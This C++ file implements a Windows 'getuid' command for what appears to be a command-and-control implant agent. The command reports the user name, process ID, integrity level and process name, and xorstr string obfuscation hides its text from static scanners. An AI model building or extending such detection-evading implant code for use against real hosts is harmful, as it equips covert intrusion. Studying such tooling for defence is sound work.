// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include "agent/commands/exec/getuid.h"

#include <string>

#include "agent/host/host_info.h"
#include "xorstr/xorstr.hpp"

// Reference: Agent::GetUID in the legacy Agent/src/Agent.cpp (clean/test), which reported the user name
// through GetUserNameA. The pid and the token's integrity level come from the same host-info helpers the
// check-in already uses, so the answer needs no extra Win32 call of its own.

namespace agent::commands::exec {

    CommandResult GetUserIdentity(const models::CheckinResponse& task) {
        // The task carries no fields, so this cannot fail on input; every value is read from the running
        // process. An empty user name would mean the token query failed, which is worth reporting.
        const std::string username = agent::host::GetUsername();
        if (username.empty()) {
            return CommandResult::Error(xorstr_("GetUID failed: the current user name could not be read"));
        }

        std::string output = xorstr_("Username: ") + username;
        output += xorstr_("\nPID: ") + std::to_string(agent::host::GetPID());
        output += xorstr_("\nCodeIntegrity: ") + agent::host::GetCodeIntegrityStatus();
        output += xorstr_("\nProcess: ") + agent::host::GetProcessName();
        (void)task;
        return CommandResult::Ok(output);
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
